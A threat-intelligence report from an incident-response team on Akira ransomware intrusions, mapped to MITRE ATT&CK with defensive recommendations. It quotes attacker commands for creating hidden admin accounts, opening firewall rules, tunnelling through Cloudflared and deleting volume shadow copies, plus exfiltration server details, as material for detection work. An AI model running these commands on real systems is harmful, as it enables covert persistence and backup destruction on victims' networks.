Equipe CERT 28 novembre 2023

Context
During the first half of 2023, CERT Intrinsec handled several incidents involving Akira
ransomware group. Companies detected ransomware’s presence, either by reacting to alerts
triggered by their security solutions, or, in worst case, by encountering encrypted files on
servers.

In all cases involving Akira’s recent operations, CERT Intrinsec’s analysis showed that the
attack was divided into 3 phases. During the first phase, Akira affiliates get into the network
by leveraging stolen passwords or by exploiting CVE-2023-20269 (Cisco ASA and FTD)
vulnerability, allowing them to conduct brute-force attack on local password without being
detected. They then perform discovery actions such as network or Active Directory scanning.
They establish their persistence in the information system by installing remote access tools
or by creating local and domain accounts. At that point, affiliates move laterally, using
Remote Desktop Protocol, to different parts of the infrastructure before collecting data,
exfiltrating them with WinSCP or Filezilla, and deleting their tracks to avoid detection. The
second phase lasts several days: affiliates stay stealthy. They might be studying exfiltrated
data or assessing technical data collected from the information system. During the last

1/21



phase, attackers come back to set up their last persistence points, disable protections, try to
destroy backups and delete volume shadow copies before running their encryption binary on
targeted servers.

This article presents the intrusion set involved in Akira’s operations handled by CERT
Intrinsec, its tactics, techniques and procedures, as well as recommendations to follow in
order to avoid facing such an incident.

CERT Intrinsec presentation
CERT Intrinsec is a French incident response team that performs its operations mainly on
France’s sector. The team deals with about 50 major incidents per year and works to help its
customers to recover from cyber-attacks and strengthen their security. Since 2017, CERT
Intrinsec has responded to hundreds of security breaches involving companies and public
entities. The majority of those incidents are related to cybercriminality and ransomware
attacks with financial objectives, hence, CERT Intrinsec follows those groups activities and
generates comprehensive intelligence from the field. ANSSI (French Cybersecurity Agency)
granted CERT Intrinsec PRIS (State-Certified Security Incident Response Service Providers)
certification. The latter testify that CERT Intrinsec meets specific incident response
requirements, using dedicated procedures, qualified people and appropriate infrastructures.
Should you need our expertises, Intrinsec provides Incident response & Crisis management
services, Threat Intelligence services & datas, IOCs Feeds, Detection services
(SOC/MDR/XDR), supported by a large set of other services (pentests & audits, consulting,
…) .

Akira Ransomware
Akira ransomware is said to have started operating in March 2023 and targeted more than
140 organisations (according to its leak site). Just like many other ransomwares, the Akira’s
encryption binary deletes volume shadow copies, targets specific file extensions and skip
files located in some directories (such as ones containing system files). It seems that the
encryption binary also shares obfuscation techniques with Conti ransomware. We can note
that Akira appears soon after last operations spotted involving Conti ransom gang. Akira’s
intrusion set shares also many techniques with other Ransomware-As-A-Service (RaaS)
actors: LSASS dumping for credential harvesting, creation of schedule tasks to perform
discovery actions, usage of publicly available tools such as PCHunter64 or Advanced IP
Scanner. They also heavily rely on RDP protocol with administrator accounts for lateral
movement and also manage to disable common defenses such as Windows Defender. Akira
recently developed a Linux encryptor to encrypt ESXi virtual machines, but CERT Intrinsec
has not observed this encryptor so far.

2/21



Akira ransomware gang claimed multiple victims from different countries, especially the
United States of America, the United Kingdom of Great Britain and Northern Ireland and
Canada. Even if manufacturing, education, construction, retail and consulting are subject to
many attacks, Akira compromised information systems from a wide range of sectors and
does not seem to target any of them. CERT Intrinsec handled incident responses for which
attacks were not claimed. This raises questions about genuine motivations of Akira
ransomware gang.

Akira Victimology
Victims analysis shows that majority of compromised companies are located in the USA
(73%). United Kingdom and Canada follow with respectively 7% and 5% of referenced
victims.

Regarding activity sectors, we have seen following trends:

14% of victims belong to manufacturing sector
11% in the education
9% construction and so on

Basically, all sectors are represented but in lower proportion.

Key takeaways
Investigations performed during Akira operations highlight that affiliates will use as many
legitimate and living-of-the-land tools as possible, possibly to ensure EDR solutions bypass.
For example, in one unique operation, we found at least 4 different command & control
solutions such as AnyDesk, Teamviewer, OpenSSH Servers and MobaXterm. Moreover, in
the first phase of the adversary’s operations, we notice adversaries efforts to stay relatively
stealthy. They managed to tunnel their outgoing traffic through CloudFlare infrastructure,
performed common reconnaissance tasks from servers where the EDR solution was not
deployed, did not access to critical, and more likely supervised, infrastructure such as
domain controllers. They conscientiously explored available file servers and managed to
compress then exfiltrate data. They splitted exfiltration into multiple steps, exfiltrating data
from a server before moving to another one.

The third part of operations, the encryption one, was marked by faster and « noisy » actions.
Indeed, this phase took place in a few hours timeframe, during such they performed a new
internal reconnaissance phase, moved laterally mainly on backup and virtualisation servers
and finished by executing their encryption binary. Moreover, attackers performed many
attempts to exfiltrate Active Directory information, performed multiple network scans with
more or less success even from EDR monitored servers and also relied on tools such as
Impacket, which can leave lots of characteristic footprints.

3/21



Operation timeline
All Akira’s operations share a common characteristic: they took place in 3 different phases,
from the start until the end of attacks.

First days of the intrusion are dedicated to ensure persistance mechanism on a few
assets, perform initial internal discovery and manage to escalate privileges. Then we
observed a pause in the operations.
The second phase is dedicated to valuable data identification, gathering and
exfiltration. We usually observed a pause of several days before the last phase.
Last phase, the encryption one, usually takes place during a short timeframe, within a
few hours. Attackers manage to ensure their persistence on multiple assets, even if
initial ones are already in place. They perform new network scans, probably to get the
list of assets required by the encryption. Affiliates usually tried to delete backups before
running the ransomware binary on as many assets as possible.

The following diagram shows these 3 steps:

Tactics, techniques and procedures

Initial Access

Technique Technique ID

External Remote Service T1133

Valid Account: Domain Accounts T1078.002

5/21



Adversaries got into the network by leveraging compromised credentials of legitimate
accounts and establishing VPN sessions using them. Some of these accounts might have
been compromised way before the incident. In two cases, attackers exploited CVE-2023-
20269 vulnerability on a Cisco ASA VPN appliance. This vulnerability allows an
unauthenticated attacker to conduct a brute-force attack on any local account while
bypassing the maximum number of attempts defined.

In order to avoid the use of legitimate accounts as initial access, CERT Intrinsec
recommends to:

Ensure that internet facing solution, such as VPN appliances are patched in priority
when security fixes are published by editors
Enforce Multi-Factor Authentication on VPN solutions
Apply the principle of least privilege when granting information system access to
partners
Review Active Directory objects to identify old, disabled or useless accounts, on a
regular basis
Enforce a strong password policy
Raise users’ awareness of phishing emails and password reuse
Ensure that no account with administrative privileges can connect directly into the VPN
solution

Execution

Technique Technique ID

Command and Scripting Interpreter: Powershell T1059.001

Command and Scripting Interpreter: Windows Command Shell T1059.003

Windows Management Instrumentation T1047

System Services: Service Execution T1569.002

Attackers leveraged PowerShell to execute commands to install Remote Server
Administration Tools (RSAT-AD), to list domain users, computers and trusts. To do so, they
used Get-ADUser and Get-ADComputer PowerShell cmdlets. They also created a new
firewall rule to allow SSH traffic. To perform discovery and persistence actions, attackers
leveraged Windows Command Shell as well as WMI via Impacket.

To spot PowerShell and Windows shell activities, you can implement the following measures:

Enable PowerShell logging features (Transcript, ScriptBlockText, ConsoleHost_history)
Enable Sysmon logging on devices

6/21



Monitor equipments to detect execution actions, especially PowerShell and Windows
Shell commands
Improve detection means by building a Security Operations Center (SOC)

Persistence

Technique Technique ID

Create or Modify System Process: Windows Service T1543.003

External Remote Services T1133

Create Account: Local Account T1136.001

Create Account: Domain Account T1136.002

Valid Accounts: Domain Accounts T1078.002

They created multiple local and domain accounts, using the following Impacket commands,
to make sure not to lose privileges if one of them is disabled or deleted.

cmd.exe /Q /c net user [ADMIN_USER] ‘[PASSWORD]’ /dom 1>
\\127.0.0.1\ADMIN$\__[TIMESTAMP] 2>&1
cmd.exe /Q /c net user [ADMIN_USER] ‘[PASSWORD]’ /add 1>
\\127.0.0.1\ADMIN$\__[TIMESTAMP] 2>&1
Attackers compromised legitimate accounts as well.

As explained previously, attackers used a lot of legitimate remote administration tools to
maintain persistence on information system, they are usually configured as Windows
Services. To detect such actions, you can:

List legitimate remote administration tools, used by your company, to spot easily those
used by attackers
Restrict the use of these tools as much as possible
Monitor actions performed by administrative accounts
Monitor suspicious Windows Services creations

Privilege Escalation

Technique Technique ID

Valid Accounts: Domain Accounts T1078.002

Valid Accounts: Local Accounts T1078.002

7/21



Throughout operations, attackers compromised several accounts, many of them being
privileged. They then used them to gain even more privileges. These accounts were:

Administrator accounts
Unused administrator account
Account used on printers
Service provider account
Monitoring account
Accounting account
Domain administrator account

Several accounts were compromised throughout the operation. It is possible to avoid such
actions by implementing the following recommendations:

Keep an inventory of accounts, especially administrative ones, up-to-date
Forbid RDP communication between equipments when it is not necessary
Deploy Windows Credential Guard to protect credentials on systems
Use dedicated administrative accounts to perform actions related to information system
administration only

Defense Evasion

Technique Technique ID

Impair Defenses: Disable or Modify System Firewall T1562.004

Indicator Removal: File Deletion T1070.004

Modify Registry T1112

Valid Accounts: Domain Account T1078.002

Impair Defenses: Disable or Modify Tools T1562.001

During operations, affiliates tried to impair defenses by either deleting evidences or avoiding
detection. They actually removed part of their tools as well as the exfiltrated archives
containing data.

After creating a malicious account, affiliates modified the following registry key in order to
hide this account from the logon screen.

cmd.exe /Q /c reg add
HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Winlogon\SpecialAccounts\UserList
/t REG_DWORD /v [USER] /d 0 /f 1> \\127.0.0.1\ADMIN$\__[TIMESTAMP] 2>&1

8/21



They created a rule to enable SSH traffic, as explained in the Persistence section, and they
edited the SYSTEM hive to enable RestrictedAdmin feature. This latter is a way to connect to
a server without sending credentials to it. It prevents administrative credentials from being
exposed to an attacker who could leverage them to escalate privileges.

The command used to enable RestrictedAdmin is as follows:

cmd.exe /Q /c reg add ‘HKLM\System\CurrentControlSet\Control\Lsa’
/v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
Finally, attackers disabled Windows Defender Real-Time Monitoring feature.

In order to slow down forensic investigations and avoid detection, attackers conducted
multiple actions. It is possible to detect those actions and to lower their impacts, by
implementing the following measures:

Collect logs from all equipments, forward them to a central server dedicated to logs
storage
Monitor firewall rules changes

Discovery

Technique Technique ID

Account Discovery: Domain Account T1087.002

Remote System Discovery T1018

File and Directory Discovery T1083

Network Service Discovery T1046

As operations were on their way, attackers kept looking for information on targeted systems.
They used network scanning tools named Netscan and Advanced IP Scanner several times.
They also browsed file servers, looking for interesting data to exfiltrate. They used Impacket
commands and nltest built-in tool to perform some of their actions.

The above commands perform the following actions:

Tell PowerShell to display all occurrences when formatting results
Install Remote Server Administration Tools
List all Active Directory users, all their properties and select several of them to display
List all Active Directory computers, all their properties and select several of them to
display

As discovery is often the first part of an intrusion set, it is crucial to detect it as early as
possible to block subsequent phases of the attack. To do so, you should:

Monitor security event logs and network connections to spot network scan activities,
accounts enumeration, etc
Monitor systems activities to detect commands executed to remote hosts

Lateral Movement

Technique Technique ID

Lateral Tool Transfer T1570

Remote Services: Remote Desktop Protocol T1021.001

Remote Services: SMB/Windows Admin Shares T1021.001

Attackers used lateral movement techniques to transfer their tools across the network, to
connect to devices and to execute commands on remote hosts. They utilised remote
administration shares (ADMIN$) to drop files on remote computers and connects via Remote
Desktop Protocol to different servers to achieve their malicious actions. Besides, Impacket
was used to execute commands on remote systems with Windows Administration Share.
Multiple hostnames were found as WorkstationName when attackers tried to authenticate to
equipments:

DESKTOP-3GCJKGQ
WIN-KFUMVU06ESH
WIN-OX9CQTDSEIK
WIN-MV7S8OJTOIK
HOST14872171171

10/21



DESKTOP-KT76603

Attackers leveraged local accounts as well, adding them to Administrators and Remote
Desktop Users groups, using net localgroup command:

net localgroup Administrators [USERNAME] /ADD
net localgroup ‘Remote Desktop Users’ [USERNAME] /add
net localgroup Administrators [USERNAME] /add 1> \\127.0.0.1\ADMIN$\__[TIMESTAMP]
2>&1
net localgroup Domain Admins [USERNAME] /add 1> \\127.0.0.1\ADMIN$\__[TIMESTAMP]
2>&1
net localgroup Remote Desktop Users [USERNAME] /add 1>
\\127.0.0.1\ADMIN$\__[TIMESTAMP] 2>&1
They also used Enter-PSSession PowerShell command to start interactive sessions on
remote devices and enable Remote Desktop Protocol, as shown below

Enter-PSSession -ComputerName [EQUIPMENT]
netsh advfirewall firewall add rule name= »allow RemoteDesktop » dir=in
protocol=TCP localport=3389 action=allow
During all operations, attackers easily moved from one equipment to another, and from one
domain to another, especially leveraging network shares. To avoid such lateral movements,
CERT Intrinsec recommends to:

Monitor information systems to detect suspicious network share accesses (use of
Impacket, network shares scan, etc)
Restrict access to administrative shares as much as possible
Build efficient isolation procedures to isolate a equipment, a VLAN or even the entire
information system

Collection

Technique Technique ID

Archive Collected Data: Archive via Utility T1560.001

To reduce the size of data to exfiltrate and to make the process more efficient, affiliates used
WinRar utility to create archives containing stolen data.

As ransomware operators often target information about human resources, employees,
projects, etc, it is very important to:

Identify sensitive data and its location, and encrypt it
Deploy a Data Loss Prevention solution

11/21



Monitor access to sensitive data

Command and Control

Technique Technique ID

Application Layer Protocol: Web Protocols T1071.001

Ingress Tool Transfer T1105

Remote Access Software T1219

External Remote Services T1133

Apart from using AnyDesk, TeamViewer, OpenSSH, MobaXTerm as Remote Administration
Tools and Cloudflared to tunnel malicious traffic through the CloudFlare infrastructure,
affiliates employed file.io, a file sharing service, to download their tools on compromised
systems. They also leveraged VPN accesses to conduct their activities on the network.

You can implement the following measures to detect command and control activities:

Monitor systems and network traffic to identify suspicious file sharing websites or
illegitimate cloud services
Install an Intrusion Prevention Solution to monitor traffic and find unusual remote hosts,
flagged C2 domain/IP address/port, etc

AnyDesk
The first way to perform command and control activities is the installation of AnyDesk, a
remote desktop application. The software was downloaded from file.io platform. Several files
related to AnyDesk installation were discovered:

C:\Users\[REDACTED]\Downloads\gcapi.dll
C:\Users\[REDACTED]\Downloads\AnyDesk.exe
C:\Windows\Temp\gcapi.dll
C:\ProgramData\gcapi.dll

A service was also created to make sure that the persistence stays up:

Service Name Command

AnyDesk C:\Program Files (x86)\AnyDesk\AnyDesk.exe –service

SSH Server

12/21



An SSH server was installed on several servers in order to maintain the access to the
information system by tunneling adversaries traffic through an SSH session. OpenSSH was
used to create this SSH server and to be able to connect to compromised systems. CERT
Intrinsec found evidences of OpenSSH in many directories:

C:\Users\[REDACTED]\Downloads\OpenSSH.msi\
C:\Program Files\OpenSSH\sshd.exe\
C:\Users\[REDACTED]\AppData\Local\Temp\7\[redacted]\bin\ssh.exe\

The service runs sshd.exe:

Service Name Command

SSHD C:\Program Files\OpenSSH\sshd.exe

A firewall rule enabling SSH traffic was created as well on servers: its display name is
OpenSSH Server (sshd). The rule is enabled and allows the inbound traffic for protocol TCP
on port 22.

New-NetFirewallRule -Name sshd -DisplayName ‘OpenSSH Server (sshd)’
-Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22

TeamViewer
TeamViewer was installed to allow access remotely to devices (C:\Program Files
(x86)\TeamViewer\TeamViewer.exe), as well as to ensure persistence to them.

MobaXTerm
Attackers downloaded MobaXTerm, using an administrator account, on one of the domain
controllers (C:\Users\[REDACTED]\Downloads\MobaXtermInstallerv23.2.zip).

Cloudflared
Attackers installed Cloudflared, a utility used to create tunnels between compromised hosts
and Cloudflare solution. The command line to build a tunnel is as follows:

regid.exe tunnel run –token [TOKEN]
They renamed the cloudflared binary to regid.exe to hide in plain sight.

Exfiltration

Technique Technique
ID

13/21



Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted T1048.002
Non-C2 Protocol

Application Layer Protocol: File Transfer Protocol T1071.002

After creating archives containing collected files, affiliates used different softwares to
exfiltrate several gigabytes of data: WinSCP and FileZilla.

FileZilla’s recentservers.xml file stores connection information and is very important to
identify where data have been sent.

<?xml version=’1.0′ encoding=’UTF-8′?>
<FileZilla3 version=’3.64.0′ platform=’windows’>
    <RecentServers>
        <Server>
            <Host>148[.]72.171.171</Host>
            <Port>22</Port>
            <Protocol>1</Protocol>
            <Type>0</Type>
            <User>Administrator</User>
            <Logontype>2</Logontype>
            <EncodingType>Auto</EncodingType>
            <BypassProxy>0</BypassProxy>
        </Server>
    </RecentServers>
</FileZilla3>
For the past few years, adversaries heavily relied on cloud storage provider such as Mega or
PCloud to store exfiltrated data. Akira’s operators behave slighly differently by uploading
encrypted rar archives directly on their own servers (A Windows workstation with OpenSSH
service installed on it). These servers are part of the same Autonomous System (30083 –
AS-30083-GO-DADDY-COM-LLC), used throughout different operations.

As part of the double extortion strategy, attackers exfiltrate sensitive data from systems and
threaten to publish it on their leak sites. Therefore, it is crucial to:

Monitor outgoing traffic (in terms of volume, IP reputation, time of communication, etc)
Improve network logging policy to ensure evidences availability in case of an
investigation

Impact

Technique Technique ID

14/21



Data Destruction T1485

Data Encrypted for Impact T1486

Inhibit System Recovery T1490

Attackers tried to delete VEEAM backups by connecting to the management console and
deleted Volume Shadow Copies using PowerShell commands:

powershell.exe -Command Get-WmiObject Win32_Shadowcopy | Remove-WmiObject
They finally encrypted equipments on the information system, using an Akira encryption
binary.

To prevent victims from recovering their data, ransomware operators try to locate backups so
as to delete them prior to encrypting files. To avoid this impact, CERT Intrinsec recommends
to:

Deploy a backup solution and test restoration process on a regular basis
Keep at least one version of the backups outside the information system
Monitor access to backup infrastructure
